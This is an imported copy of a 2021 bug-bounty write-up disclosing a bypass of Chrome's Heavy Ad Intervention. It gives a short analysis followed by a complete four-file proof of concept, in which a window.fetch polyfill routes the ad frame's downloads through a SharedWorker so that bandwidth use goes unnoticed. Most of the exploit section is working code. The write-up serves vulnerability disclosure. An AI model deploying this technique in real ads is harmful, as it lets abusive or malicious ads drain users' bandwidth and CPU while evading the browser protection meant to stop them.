---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-09_bypass-chrome-ad-heavy-detection-mechanism_2.md
original_filename: 2021-11-09_bypass-chrome-ad-heavy-detection-mechanism_2.md
title: Bypass Chrome Ad-Heavy detection mechanism
category: documents
detected_topics:
- command-injection
- graphql
tags:
- imported
- documents
- command-injection
- graphql
language: en
raw_sha256: 23c813407dfcca84fbe4f1614a7248feff8e4e20a11667e783762b1e131fee84
text_sha256: 5070db5d581fa5ab75788fdd470893a4d9c39ed6b9dab4e15767eaec12e22c0d
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: false
---

# Bypass Chrome Ad-Heavy detection mechanism

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-09_bypass-chrome-ad-heavy-detection-mechanism_2.md
- Source Type: markdown
- Detected Topics: command-injection, graphql
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: False
- Raw SHA256: `23c813407dfcca84fbe4f1614a7248feff8e4e20a11667e783762b1e131fee84`
- Text SHA256: `5070db5d581fa5ab75788fdd470893a4d9c39ed6b9dab4e15767eaec12e22c0d`


## Content

---
title: "Bypass Chrome Ad-Heavy detection mechanism"
url: "https://0x0021h.medium.com/bypass-chrome-ad-heavy-detection-mechanism-25c9e2e4a0c4"
authors: ["0x0021h (@0x0021h)"]
programs: ["Google (Chrome)"]
bugs: ["Browser hacking"]
publication_date: "2021-11-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3187
scraped_via: "browseros"
---

# Bypass Chrome Ad-Heavy detection mechanism

Bypass Chrome Ad-Heavy detection mechanism
0x0021h
Follow
3 min read
·
Nov 9, 2021

1

Press enter or click to view image in full size

Description:

The Chrome Ad-Heavy mechanism prevents attacks against malware that may masquerade as ads. Researchers have discovered a vulnerability in the way Chrome tracks Ad-Heavy that allows malicious ad authors to place memory- and CPU-hungry ads without being “killed” by Chrome’s Ad-Heavy detection mechanism. Impact: All Chrome versions that support Ad-Heavy (Chrome 92.0.4515.159 and higher)

Vulnerability Analysis

PoC provides a polyfill for window.fetch that delegates the network request to SharedWorker. SharedWorker’s bandwidth is not tracked as part of the ad unit, so it can make the network request and then send the response back to the ad unit frame via postMessage without triggering the Chrome’s ad intervention logic.

Exploit:

Get 0x0021h’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

adunit.html

<html>
<head>
<style>
* {
font-family: 'Helvetica', sans-sarif;
}
.header {
font-size: 1.5rem;
font-weight: 700;
color: red;
}
</style>
</head>
<body>
The frame will now start violating the heavy ad intervention rules, please hold...
<p class="header">DO NOT CLICK THIS FRAME!</p>
<small>Clicking this frame will disable heavy ad intervention on it</small>
<br/>
<p>
To ensure this is an ad:
<ol>
<li>Open DevTools (Ctrl + Shift + I)</li>
<li>Cutsomize and control DevTools (Three vertical dots) -> More tools -> Rendering</li>
<li>Enable `Highlight ad frames`</li>
</ol>
Verify that this frame is then colored red to ensure it is detected as an ad-frame by Chrome.
</p>
<div id="output"></div>
<script>
// Your heavy ad intervention bypass goes here:
// alert("Ad loaded - Insert your script in adunit.html");
/*
This is a very basic polyfill for window.fetch via a shared worker.
This works as a drop-in replacement to window.fetch.
It currently doesn't handle well errors or multiple simultaneous requests with the same URL,
but it works for demo purposes. More robust implementation can be made fairly easily.
To debug shared workers, need to use chrome://inspect/#workers
Delegated network requests will only appear in the shared worker's DevTools.
*/
var resolveResponse = {};
var sharedWorker = new SharedWorker('shared-worker.js');
sharedWorker.port.onmessage = (event) => {
if (event.data.fetchUrl && event.data.fetchResponse) {
console.info('Response:', event.data.fetchResponse);
var response = new Response(event.data.fetchResponse);
resolveResponse[event.data.fetchUrl](response);
delete resolveResponse[event.data.fetchUrl]; // Save memory, not strictly needed
} else {
console.warn('Received unexpected message from shared worker');
}
};
var originalFetch = window.fetch; // For easy behavior comparison
window.fetch = (fetchUrl) => {
// Uncomment line below to see how PoC works with original fetch
// return originalFetch(fetchUrl);
return new Promise((resolve, reject) => {
resolveResponse[fetchUrl] = resolve;
// return resolveResponse[fetchUrl](new Response('Test response')); // For development purposes
sharedWorker.port.postMessage({ fetchUrl: fetchUrl });
});
}
</script>
<script defer="" type="text/javascript">
// Loop download of a 10MB file to trigger heavy ad intervention's network limit
function download() {
// Removed recursive calling, since single resource load will trigger intervention.
// Added output for verification purposes.
// Using jsdeliver.net or same-origin file does not affect behavior
// fetch('./big.bin').then(response => {
fetch('https://cdn.jsdelivr.net/gh/ssd-secure-disclosure/challenges/chrome-ad-heavy/big.bin').then(response => {
return response.text();
}).then(response => {
output.innerText = 'Response: '+response.substr(0,100)+'... (total length: '+response.length+')';
// Feel free to test recursive calling if desired.
// download();
});
}
download();
</script>
</body>
</html>

gads.js

"use strict";
const iframe = document.createElement("iframe");
iframe.src = "adunit.html";
iframe.style = "width: 98vw; height: 60vh";
document.body.appendChild(iframe);

shared-worker.js

/* shared-worker.js */
// Part of window.fetch polyfill, makes requests on behalf of page.
// To debug shared workers, need to use chrome://inspect/#workers
// Delegated network requests will only appear in the shared worker's DevTools.
self.onconnect = (event) => {
var port = event.ports[0];
port.onmessage = (event) => {
if (event.data.fetchUrl) {
var fetchUrl = event.data.fetchUrl;
fetch(fetchUrl).then(response => {
response.blob().then(blob => {
port.postMessage({ fetchUrl: fetchUrl, fetchResponse: blob });
});
});
} else {
console.warn('Must send fetchUrl in message.');
}
}
}

index.html

<!-- index.html -->
<html>
<head></head>
<body>
<p>Hello! This is the main site. </p>
<p>The ad should be loaded below:</p>
<script src="gads.js"></script>
</body>
</html>
